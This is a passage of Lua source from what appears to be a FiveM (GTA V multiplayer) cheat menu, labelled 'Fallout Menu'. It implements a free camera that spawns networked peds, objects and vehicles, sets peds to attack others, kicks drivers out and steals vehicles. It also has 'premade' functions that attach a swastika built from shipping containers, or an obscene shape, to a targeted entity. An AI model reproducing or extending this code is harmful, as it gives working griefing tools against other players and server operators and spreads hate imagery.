               local dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(px, py, pz, x, y, z)
               local scale = (1 / dist) * 20
               local fov = (1 / ADRVSDD:GetFunction("GetGameplayCamFov")()) * 100
               local scale = scale * fov
               ADRVSDD:GetFunction("SetTextScale")(scaleX * scale, scaleY * scale)
               ADRVSDD:GetFunction("SetTextFont")(fontId)
               ADRVSDD:GetFunction("SetTextProportional")(1)
               ADRVSDD:GetFunction("SetTextColour")(250, 250, 250, 255) -- You can change the text color here
               ADRVSDD:GetFunction("SetTextDropShadow")(1, 1, 1, 1, 255)
               ADRVSDD:GetFunction("SetTextEdge")(2, 0, 0, 0, 150)
               ADRVSDD:GetFunction("SetTextDropShadow")()
               ADRVSDD:GetFunction("SetTextOutline")()
               ADRVSDD:GetFunction("BeginTextCommandDisplayText")("STRING")
               ADRVSDD:GetFunction("SetTextCentre")(1)
               ADRVSDD:GetFunction("AddTextComponentSubstringPlayerName")(textInput)
               ADRVSDD:GetFunction("SetDrawOrigin")(x, y, z + 2, 0)
               ADRVSDD:GetFunction("EndTextCommandDisplayText")(0.0, 0.0)
               ADRVSDD:GetFunction("ClearDrawOrigin")()
           end
       
           function ADRVSDD.FreeCam:DrawInfoCard(entity)
               if not ADRVSDD:GetFunction("DoesEntityExist")(entity) then return end
               local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.0, 0.0, 0.0)
               local angle = ADRVSDD:GetFunction("GetEntityRotation")(entity)
       
               if frozen_ents[entity] == nil then
                   frozen_ents[entity] = false
               end
       
               local str = {" Model: " .. ADRVSDD:GetFunction("GetEntityModel")(entity), " Pos: " .. ("x: %.2f, y: %.2f, z: %.2f"):format(coords.x, coords.y, coords.z), " Rot: " .. ("x: %.2f, y: %.2f, z: %.2f"):format(angle.x, angle.y, angle.z), " Frozen: " .. dict.tostring(frozen_ents[entity])}
               local y = coords.z
       
               for _, val in dict.pairs(str) do
                   ADRVSDD:DrawScaled3DText(coords.x, coords.y, y, val, 4, 0.1, 0.1)
                   y = y - 0.35
               end
           end
       
           function ADRVSDD.FreeCam:CheckType(entity, type)
               if type == "ALL" then return ADRVSDD:GetFunction("IsEntityAnObject")(entity) or ADRVSDD:GetFunction("IsEntityAVehicle")(entity) or ADRVSDD:GetFunction("IsEntityAPed")(entity) end
               if type == "VEHICLE" then return ADRVSDD:GetFunction("IsEntityAVehicle")(entity) end
               if type == "PED" then return ADRVSDD:GetFunction("IsEntityAPed")(entity) end
       
               return true
           end
       
           function ADRVSDD.FreeCam:GetType(entity)
               if ADRVSDD:GetFunction("IsEntityAnObject")(entity) then return "OBJECT" end
               if ADRVSDD:GetFunction("IsEntityAVehicle")(entity) then return "VEHICLE" end
               if ADRVSDD:GetFunction("IsEntityAPed")(entity) then return "PED" end
           end
       
           function ADRVSDD.FreeCam:Clone(entity)
               local type = self:GetType(entity)
               if not type then return end
               local where = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(entity, 0.1, 0.1, 0.1)
               local rot = ADRVSDD:GetFunction("GetEntityRotation")(entity)
       
               if type == "OBJECT" then
                   local clone = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, true, true, true)
                   ADRVSDD:DoNetwork(clone)
                   ADRVSDD:GetFunction("SetEntityRotation")(clone, rot)
                   frozen_ents[clone] = frozen_ents[entity]
                   self.DraggingEntity = clone
                   ADRVSDD:AddNotification("INFO", "Cloned object ~y~" .. entity)
                   Wait(50)
               elseif type == "VEHICLE" then
                   local clone = ADRVSDD:GetFunction("CreateVehicle")(ADRVSDD:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, ADRVSDD:GetFunction("GetEntityHeading")(entity), true, true)
                   ADRVSDD:GetFunction("SetEntityRotation")(clone, rot)
                   frozen_ents[clone] = frozen_ents[entity]
                   self.DraggingEntity = clone
                   ADRVSDD:AddNotification("INFO", "Cloned vehicle ~y~" .. entity)
               elseif type == "PED" then
                   local clone = ADRVSDD:GetFunction("CreatePed")(4, ADRVSDD:GetFunction("GetEntityModel")(entity), where.x, where.y, where.z, ADRVSDD:GetFunction("GetEntityHeading")(entity), true, true)
                   ADRVSDD:GetFunction("SetEntityRotation")(clone, rot)
                   frozen_ents[clone] = frozen_ents[entity]
                   self.DraggingEntity = clone
                   ADRVSDD:AddNotification("INFO", "Cloned ped ~y~" .. entity)
               end
           end
       
           function ADRVSDD.FreeCam:Remover(entity, type)
               ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Delete"}, {"b_117", "Change Mode"}})
       
               if ADRVSDD:GetFunction("DoesEntityExist")(entity) and ADRVSDD:GetFunction("DoesEntityHaveDrawable")(entity) and self:CheckType(entity, type) then
                   self:DrawBoundingBox(entity, 255, 50, 50, 50)
       
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE1"]) and not ADRVSDD.Showing then
                       if entity == ADRVSDD:GetFunction("PlayerPedId")() then return ADRVSDD:AddNotification("ERROR", "You can not delete yourself!", 10000) end
                       if _is_ped_player(entity) then return ADRVSDD:AddNotification("ERROR", "You can not delete players!", 10000) end
                       self:DrawBoundingBox(entity, 255, 50, 50, 50)
                       ADRVSDD:AddNotification("INFO", "Deleted ~y~" .. dict.tostring(entity), 10000)
                       ADRVSDD.Util:DeleteEntity(entity)
       
                       return
                   end
               end
           end
       
           function ADRVSDD.FreeCam:Attack(attacker, victim)
               ADRVSDD:GetFunction("ClearPedTasks")(attacker)
       
               if ADRVSDD:GetFunction("IsEntityAPed")(victim) then
                   ADRVSDD:GetFunction("TaskCombatPed")(attacker, victim, 0, 16)
                   ADRVSDD:AddNotification("INFO", "~y~" .. dict.tostring(attacker) .. " ~w~attacking ~y~" .. dict.tostring(victim), 5000)
               elseif ADRVSDD:GetFunction("IsEntityAVehicle")(victim) then
                   CreateThread(function()
                       ADRVSDD:StealVehicleThread(attacker, victim)
                   end)
       
                   ADRVSDD:AddNotification("INFO", "~y~" .. dict.tostring(attacker) .. " ~w~stealing ~y~" .. dict.tostring(victim), 5000)
               end
           end
       
           local beginning_target
       
           function ADRVSDD.FreeCam:PedTarget(cam, x, y, z)
               local rightVec, forwardVec, upVec = ADRVSDD:GetFunction("GetCamMatrix")(cam)
               local curVec = vector3(x, y, z)
               local targetVec = curVec + forwardVec * 150
               local handle = ADRVSDD:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
               local _, _, endCoords, _, entity = ADRVSDD:GetFunction("GetShapeTestResult")(handle)
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE2"]) then
                   beginning_target = nil
               end
       
               if not ADRVSDD:GetFunction("DoesEntityExist")(beginning_target) then
                   beginning_target = nil
               else
                   self:DrawBoundingBox(beginning_target, 0, 100, 0, 50)
       
                   if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["R"]) then
                       ADRVSDD:GetFunction("ClearPedTasks")(beginning_target)
                       ADRVSDD:GetFunction("ClearPedSecondaryTask")(beginning_target)
                       ADRVSDD:AddNotification("SUCCESS", "Cleared tasks for ~y~" .. beginning_target)
                       beginning_target = nil
                   end
               end
       
               if ADRVSDD:GetFunction("DoesEntityExist")(entity) and ADRVSDD:GetFunction("DoesEntityHaveDrawable")(entity) and not ADRVSDD:GetFunction("IsEntityAnObject")(entity) then
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE1"]) and not beginning_target then
                       if ADRVSDD:GetFunction("IsEntityAVehicle")(entity) then
                           entity = ADRVSDD:GetFunction("GetPedInVehicleSeat")(entity, -1)
                       end
       
                       beginning_target = entity
                   end
       
                   if beginning_target ~= entity then
                       self:DrawBoundingBox(entity, 0, 122, 200, 50)
       
                       if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE1"]) and ADRVSDD:GetFunction("DoesEntityExist")(beginning_target) then
                           self:Attack(beginning_target, entity)
                           beginning_target = nil
                       end
                   end
               end
           end
       
           local selected_spawner_opt = 1
           local selected_weapon_opt = 1
           local asking_weapon
           local selected_ped
           local selected_weapon
       
           ADRVSDD.FreeCam.SpawnerOptions = {
               ["PED"] = {"s_f_y_bartender_01", "a_m_y_beachvesp_01", "a_m_y_beach_03", "a_m_y_beach_02", "a_m_m_beach_02", "a_m_y_beach_01", "s_m_y_baywatch_01", "mp_f_boatstaff_01", "u_m_m_bikehire_01", "a_f_y_bevhills_04", "s_m_m_bouncer_01", "s_m_y_armymech_01", "s_m_y_autopsy_01", "s_m_y_blackops_01", "s_m_y_blackops_02"},
               ["WEAPONS"] = all_weapons,
               ["OBJECT"] = {"a_c_cat_01", "prop_mp_spike_01", "prop_tyre_spike_01", "prop_container_ld2", "lts_prop_lts_ramp_03", "prop_jetski_ramp_01", "prop_mp_ramp_03_tu", "prop_skate_flatramp_cr", "stt_prop_ramp_adj_loop", "stt_prop_ramp_multi_loop_rb", "stt_prop_ramp_spiral_l", "stt_prop_ramp_spiral_l_m", "prop_const_fence03b_cr", "prop_const_fence02b", "prop_const_fence03a_cr", "prop_fnc_farm_01e", "prop_fnccorgm_02c", "ch3_01_dino", "p_pallet_02a_s", "prop_conc_blocks01a", "hei_prop_cash_crate_half_full", "prop_consign_01a", "prop_byard_net02", "prop_mb_cargo_04b", "prop_mb_crate_01a_set", "prop_pipe_stack_01", "prop_roadcone01c", "prop_rub_cage01b", "prop_sign_road_01a", "prop_sign_road_03m", "prop_traffic_rail_2", "prop_traffic_rail_1a", "prop_traffic_03a", "prop_traffic_01d", "prop_skid_trolley_1", "hei_prop_yah_seat_03", "hei_prop_yah_table_03", "lts_prop_lts_elecbox_24", "lts_prop_lts_elecbox_24b", "p_airdancer_01_s", "p_amb_brolly_01", "p_amb_brolly_01_s", "p_dumpster_t", "p_ld_coffee_vend_01", "p_patio_lounger1_s", "p_yacht_sofa_01_s", "prop_air_bagloader2_cr", "prop_air_bigradar", "prop_air_blastfence_01", "prop_air_stair_01", "prop_air_sechut_01", "prop_airport_sale_sign"},
               ["VEHICLE"] = car_spam,
               ["PREMADE"] = {
                   ["SWASTIKA"] = function(ent, offZ)
                       if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
                       CreateThread(function()
                           local where = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)
       
                           if not ADRVSDD:GetFunction("IsEntityAPed")(ent) then
                               where = vector3(where.x, where.y, where.z + 5.0)
                           end
       
                           if offZ then
                               where = vector3(where.x, where.y, where.z + offZ)
                           end
       
                           local column = {
                               ["up"] = {},
                               ["across"] = {}
                           }
       
                           for i = 0, 7 do
                               column["up"][i + 1] = {
                                   x = 0.0,
                                   y = 0.0,
                                   z = 1.0 + (2.6 * (i + 1)),
                                   _p = 90.0,
                                   _y = 0.0,
                                   _r = 0.0
                               }
                           end
       
                           for i = 0, 8 do
                               column["across"][i + 1] = {
                                   x = 10.4 + (-2.6 * i),
                                   y = 0.0,
                                   z = 11.6,
                                   _p = 90.0,
                                   _y = 0.0,
                                   _r = 0.0
                               }
                           end
       
                           local arms = {
                               ["bottom_right"] = {},
                               ["across_up"] = {},
                               ["top_left"] = {},
                               ["across_down"] = {}
                           }
       
                           for i = 0, 4 do
                               arms["bottom_right"][i] = {
                                   x = -2.6 * i,
                                   y = 0.0,
                                   z = 1.0,
                                   _p = 90.0,
                                   _y = 0.0,
                                   _r = 0.0
                               }
       
                               arms["top_left"][i] = {
                                   x = 2.6 * i,
                                   y = 0.0,
                                   z = 22.2,
                                   _p = 90.0,
                                   _y = 0.0,
                                   _r = 0.0
                               }
       
                               arms["across_down"][i + 1] = {
                                   x = 10.4,
                                   y = 0.0,
                                   z = 12.6 - (2.25 * (i + 1)),
                                   _p = 90.0,
                                   _y = 0.0,
                                   _r = 0.0
                               }
                           end
       
                           for i = 0, 3 do
                               arms["across_up"][i + 1] = {
                                   x = -10.4,
                                   y = 0.0,
                                   z = 11.6 + (2.6 * (i + 1)),
                                   _p = 90.0,
                                   _y = 0.0,
                                   _r = 0.0
                               }
                           end
       
                           local positions = {column["up"], column["across"], arms["bottom_right"], arms["across_up"], arms["top_left"], arms["across_down"]}
                           ADRVSDD:RequestModelSync("prop_container_05a")
       
                           for _, seg in dict.pairs(positions) do
                               for k, v in dict.pairs(seg) do
                                   local obj = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")("prop_container_05a"), where.x, where.y, where.z + (offZ or 0), true, true, true)
                                   ADRVSDD:DoNetwork(obj)
                                   ADRVSDD:GetFunction("AttachEntityToEntity")(obj, ent, ADRVSDD:GetFunction("IsEntityAPed")(ent) and ADRVSDD:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, v.x, v.y, v.z + (offZ or 0), v._p, v._y, v._r, false, true, false, false, 1, true)
                                   Wait(80)
                               end
                           end
                       end)
                   end,
                   ["DICK"] = function(ent)
                       if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
                       CreateThread(function()
                           local where = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)
       
                           if not ADRVSDD:GetFunction("IsEntityAPed")(ent) then
                               where = vector3(where.x, where.y, where.z + 5.0)
                           end
       
                           ADRVSDD:RequestModelSync("stt_prop_stunt_bowling_ball")
                           local ball_l = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)
                           ADRVSDD:DoNetwork(ball_l)
                           ADRVSDD:GetFunction("AttachEntityToEntity")(ball_l, ent, ADRVSDD:GetFunction("IsEntityAPed")(ent) and ADRVSDD:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -3.0, 0, 0.0, 0.0, 0.0, 180.0, false, true, false, false, 1, true)
                           Wait(50)
                           local ball_r = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")("stt_prop_stunt_bowling_ball"), where.x, where.y, where.z, true, true, true)
                           ADRVSDD:DoNetwork(ball_r)
                           ADRVSDD:GetFunction("AttachEntityToEntity")(ball_r, ent, ADRVSDD:GetFunction("IsEntityAPed")(ent) and ADRVSDD:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, 3.0, 0, 0.0, 0.0, 0.0, 0.0, false, true, false, false, 1, true)
                           Wait(50)
                           local shaft = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")("prop_container_ld2"), where.x, where.y, where.z, true, true, true)
                           ADRVSDD:DoNetwork(shaft)
                           ADRVSDD:GetFunction("AttachEntityToEntity")(shaft, ent, ADRVSDD:GetFunction("IsEntityAPed")(ent) and ADRVSDD:GetFunction("GetPedBoneIndex")(ped, 57005) or 0, -1.5, 0, 5.0, 90.0, 0, 90.0, false, true, false, false, 1, true)
                           Wait(50)
                       end)
                   end
               }
           }
       
           local preview_object
           local preview_object_model
           local premade_options = {}
           local funcs = {}
       
           for name, func in dict.pairs(ADRVSDD.FreeCam.SpawnerOptions["PREMADE"]) do
               table.insert(premade_options, name)
               table.insert(funcs, func)
           end
       
           function ADRVSDD.FreeCam:DeletePreview()
               if preview_object and ADRVSDD:GetFunction("DoesEntityExist")(preview_object) then
                   ADRVSDD.Util:DeleteEntity(preview_object)
                   preview_object = nil
               end
       
               preview_object = nil
               preview_object_model = nil
           end
       
           local bad_models = {}
           local _loading
           local notif_alpha = 0
           local doing_alpha
           local last_alpha
           local cur_notifs
           local offX = 0
       
           function ADRVSDD.FreeCam:Spawner(where, heading, type)
               local name, options
               local cam_rot = ADRVSDD:GetFunction("GetCamRot")(self.Cam, 0)
               if self.DraggingEntity and ADRVSDD:GetFunction("DoesEntityExist")(self.DraggingEntity) then return self:DeletePreview() end
       
               if type == "PED" then
                   options = self.SpawnerOptions["PED"]
       
                   if selected_spawner_opt > #options then
                       selected_spawner_opt = 1
                   end
       
                   if preview_object then
                       self:DeletePreview()
                   end
       
                   name = "Ped List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
                   ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["LEFTCTRL"], 0), "Invisibility"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["LEFTSHIFT"], 0), "God Mode"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["E"], 0), "Clone"}})
               elseif type == "OBJECT" then
                   asking_weapon = false
                   selected_weapon_opt = 1
                   options = self.SpawnerOptions["OBJECT"]
       
                   if selected_spawner_opt > #options then
                       selected_spawner_opt = 1
                   end
       
                   local cur_model = options[selected_spawner_opt]
       
                   if preview_object_model ~= cur_model and not _loading then
                       _loading = true
       
                       CreateThread(function()
                           if not ADRVSDD:RequestModelSync(cur_model, 500) and not bad_models[cur_model] then
                               _loading = false
                               self:DeletePreview()
                               bad_models[cur_model] = true
       
                               return ADRVSDD:AddNotification("ERORR", "Failed to load model ~r~" .. cur_model, 5000)
                           end
       
                           if bad_models[cur_model] then
                               _loading = false
                               self:DeletePreview()
       
                               return
                           end
       
                           if ADRVSDD:GetFunction("HasModelLoaded")(cur_model) then
                               _loading = false
                               self:DeletePreview()
                               preview_object = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")(cur_model), where.x, where.y, where.z + 0.5, false, true, true)
                               ADRVSDD:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5)
                               ADRVSDD:GetFunction("SetEntityAlpha")(preview_object, 100)
                               ADRVSDD:GetFunction("FreezeEntityPosition")(preview_object, true)
                               ADRVSDD:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
                               ADRVSDD:GetFunction("SetEntityCollision")(preview_object, false, false)
                               preview_object_model = cur_model
                           end
                       end)
                   end
       
                   if preview_object and ADRVSDD:GetFunction("DoesEntityExist")(preview_object) then
                       ADRVSDD:GetFunction("SetEntityCoords")(preview_object, where.x, where.y, where.z + 0.5)
                       ADRVSDD:GetFunction("SetEntityAlpha")(preview_object, 100)
                       ADRVSDD:GetFunction("FreezeEntityPosition")(preview_object, true)
                       ADRVSDD:GetFunction("SetEntityRotation")(preview_object, 0.0, 0.0, cam_rot.z + 0.0)
                       ADRVSDD:GetFunction("SetEntityCollision")(preview_object, false, false)
                   end
       
                   name = "Object List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
                   ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["LEFTCTRL"], 0), "Attach (Hovered)"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["E"], 0), "Clone"}})
               elseif type == "PREMADE" then
                   asking_weapon = false
                   selected_weapon_opt = 1
                   options = premade_options
       
                   if selected_spawner_opt > #options then
                       selected_spawner_opt = 1
                   end
       
                   if preview_object then
                       self:DeletePreview()
                   end
       
                   name = "Premade List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
               elseif type == "VEHICLE" then
                   asking_weapon = false
                   selected_weapon_opt = 1
                   options = self.SpawnerOptions["VEHICLE"]
       
                   if selected_spawner_opt > #options then
                       selected_spawner_opt = 1
                   end
       
                   if preview_object then
                       self:DeletePreview()
                   end
       
                   name = "Vehicle List" .. " (" .. selected_spawner_opt .. "/" .. #options .. ")"
               end
       
               if asking_weapon then
                   options = self.SpawnerOptions["WEAPONS"]
                   name = "Weapon List (" .. selected_weapon_opt .. "/" .. #options .. ")"
               end
       
               ADRVSDD.Painter:DrawText("~w~[~y~Fallout Menu~w~] " .. (name or "?"), 4, false, ADRVSDD:ScrW() - 360 - 21 - offX, 21, 0.35, 255, 255, 255, 255)
               local sY = 30
               local max_opts = 30
               local cur_opt = (asking_weapon and selected_weapon_opt or selected_spawner_opt)
               local count = 0
               local total_opts = (#options or {})
               local can_see = true
       
               for id, val in dict.pairs(options or {}) do
                   if total_opts > max_opts then
                       can_see = cur_opt - 10 <= id and cur_opt + 10 >= id
                   else
                       count = 0
                   end
       
                   if can_see and count <= 10 then
                       local r, g, b = 255, 255, 255
       
                       if (asking_weapon and selected_weapon_opt or selected_spawner_opt) == id then
                           r, g, b = ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3]
                       end
       
                       ADRVSDD.Painter:DrawText(val, 4, false, ADRVSDD:ScrW() - 360 - 21 - offX, 21 + sY, 0.35, r, g, b, 255)
                       sY = sY + 20
                       count = count + 1
                   end
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["DOWN"]) and not ADRVSDD.Showing then
                   if asking_weapon then
                       local new = selected_weapon_opt + 1
       
                       if options[new] then
                           selected_weapon_opt = new
                       else
                           selected_weapon_opt = 1
                       end
                   else
                       local new = selected_spawner_opt + 1
       
                       if options[new] then
                           selected_spawner_opt = new
                       else
                           selected_spawner_opt = 1
                       end
                   end
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["UP"]) and not ADRVSDD.Showing then
                   if asking_weapon then
                       local new = selected_weapon_opt - 1
       
                       if options[new] then
                           selected_weapon_opt = new
                       else
                           selected_weapon_opt = #options
                       end
                   else
                       local new = selected_spawner_opt - 1
       
                       if options[new] then
                           selected_spawner_opt = new
                       else
                           selected_spawner_opt = #options
                       end
                   end
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["ENTER"]) and not ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE1"]) and not ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["SPACE"]) and not ADRVSDD.Showing then
                   if type == "PED" then
                       if not asking_weapon then
                           selected_ped = options[selected_spawner_opt]
                           asking_weapon = true
                       else
                           selected_weapon = options[selected_weapon_opt]
                           local ped = ADRVSDD:SpawnPed(where, heading, selected_ped, selected_weapon)
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                               SetEntityInvincible(ped, true)
                           end
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTCTRL"]) then
                               ADRVSDD:GetFunction("SetEntityVisible")(ped, false)
                           end
       
                           ADRVSDD:AddNotification("SUCCESS", "Spawned ped.", 5000)
                       end
                   elseif type == "OBJECT" then
                       local object = options[selected_spawner_opt]
                       ADRVSDD:RequestModelSync(object)
                       local obj = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")(object), where.x, where.y, where.z, true, true, true)
                       ADRVSDD:DoNetwork(obj)
                       ADRVSDD:GetFunction("SetEntityRotation")(obj, 0.0, 0.0, cam_rot.z + 0.0)
       
                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTCTRL"]) and ADRVSDD:GetFunction("DoesEntityExist")(self.HoveredEntity) then
                           ADRVSDD:GetFunction("AttachEntityToEntity")(obj, self.HoveredEntity, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
                       end
       
                       Wait(50)
                   elseif type == "PREMADE" then
                       local func = funcs[selected_spawner_opt]
                       func(self.HoveredEntity)
                   elseif type == "VEHICLE" then
                       local model = options[selected_spawner_opt]
                       ADRVSDD:RequestModelSync(model)
                       local veh = ADRVSDD:GetFunction("CreateVehicle")(ADRVSDD:GetFunction("GetHashKey")(model), where.x, where.y, where.z, 0.0, true, true)
                       ADRVSDD:DoNetwork(veh)
                   end
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["BACKSPACE"]) and not ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE2"]) and asking_weapon and not ADRVSDD.Showing then
                   asking_weapon = false
                   selected_weapon_opt = 1
               end
       
               ADRVSDD.Painter:DrawRect(ADRVSDD:ScrW() - 360 - 21 - offX, 20, 360, sY + 8, 0, 0, 0, 200)
               ADRVSDD.Painter:DrawRect(ADRVSDD:ScrW() - 360 - 21 - offX, 49, 360, 2, ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3], 255)
           end
       
           local rotP, rotY, rotR
           local dist = {0, 45, 90, 135, 180, -45, -90, -135, -180}
           local smallest, index = dict.math.huge, 0
       
           local function _snap(rot)
               for _, val in dict.pairs(dist) do
                   local diff = dict.math.abs(val - rot)
       
                   if diff <= smallest then
                       smallest = diff
                       index = _
                   end
               end
       
               return dist[index] or rot
           end
       
           function ADRVSDD:KickOutAllPassengers(ent, specific)
               for i = -1, ADRVSDD:GetFunction("GetVehicleMaxNumberOfPassengers")(ent) - 1 do
                   if not ADRVSDD:GetFunction("IsVehicleSeatFree")(ent, i) and (not specific or specific == i) then
                       ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("GetPedInVehicleSeat")(ent, i))
                       ADRVSDD:GetFunction("ClearPedSecondaryTask")(ADRVSDD:GetFunction("GetPedInVehicleSeat")(ent, i))
                       ADRVSDD:GetFunction("ClearPedTasksImmediately")(ADRVSDD:GetFunction("GetPedInVehicleSeat")(ent, i))
                   end
               end
           end
       
           local _stealing
           local _stealing_ped
       
           function ADRVSDD.FreeCam:DoSteal(ent)
               ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["LEFTSHIFT"], 0), "Invisible"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["LEFTALT"], 0), "Fuck Up Speed"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["R"], 0), "Kick Out Driver"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE2"], 0), "Steal (NPC)"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Steal (Self)"}, {"b_117", "Change Mode"}})
               if not self:CheckType(ent, "VEHICLE") then return end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE2"]) then
                   CreateThread(function()
                       _stealing = ent
                       local model = ADRVSDD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ADRVSDD.FreeCam.SpawnerOptions.PED)]
       
                       if not ADRVSDD:RequestModelSync(model) then
                           _stealing = nil
       
                           return ADRVSDD:AddNotification("ERROR", "Failed to steal vehicle!")
                       end
       
                       local c = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)
                       local x, y, z = c.x, c.y, c.z
                       local out, pos = ADRVSDD:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)
       
                       if not out then
                           pos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0) + vector3(dict.math.random(-3, 3), dict.math.random(-3, 3), 0)
                       end
       
                       local random_npc = ADRVSDD:GetFunction("CreatePed")(24, ADRVSDD:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)
                       _stealing_ped = random_npc
       
                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                           ADRVSDD:GetFunction("SetEntityVisible")(random_npc, false)
                       end
       
                       ADRVSDD:GetFunction("SetPedAlertness")(random_npc, 0.0)
                       local success = ADRVSDD:StealVehicleThread(random_npc, _stealing)
                       ADRVSDD:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
                       local timeout = 0
       
                       if not success then
                           _stealing = nil
                           _stealing_ped = nil
       
                           return
                       end
       
                       while ADRVSDD:GetFunction("DoesEntityExist")(_stealing) and ADRVSDD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not ADRVSDD:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do
                           timeout = timeout + 10
                           Wait(100)
                       end
       
                       if ADRVSDD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
                           _stealing = nil
       
                           return ADRVSDD:AddNotification("ERROR", "Failed to steal vehicle!")
                       end
       
                       _stealing_ped = nil
                       _stealing = nil
                   end)
               elseif ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE1"]) then
                   CreateThread(function()
                       _stealing = ent
                       ADRVSDD:KickOutAllPassengers(ent)
                       ADRVSDD:GetFunction("TaskWarpPedIntoVehicle")(ADRVSDD:GetFunction("PlayerPedId")(), ent, -1)
                       _stealing_ped = nil
                       _stealing = nil
                   end)
               elseif ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["R"]) then
                   CreateThread(function()
                       _stealing = ent
                       local driver = ADRVSDD:GetFunction("GetPedInVehicleSeat")(ent, -1)
                       ADRVSDD:KickOutAllPassengers(ent, -1)
